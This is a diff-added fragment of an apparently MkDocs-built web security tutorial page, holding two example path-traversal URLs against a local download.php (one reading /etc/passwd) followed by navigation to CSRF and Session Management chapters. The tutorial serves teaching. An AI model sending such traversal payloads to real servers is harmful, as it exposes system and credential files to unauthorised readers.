+<pre><code>http://localhost/download.php?file=../download.php
+http://localhost/download.php?file=../../../../etc/passwd
+</code></pre>
+                
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../10CSRF/" title="CSRF" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                CSRF
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../12Session_Management/" title="Session Management" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                Session Management
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+        
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/application.5e60981f.js"></script>
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
+      
+    
+    
+      
+    
+  </body>
+</html>
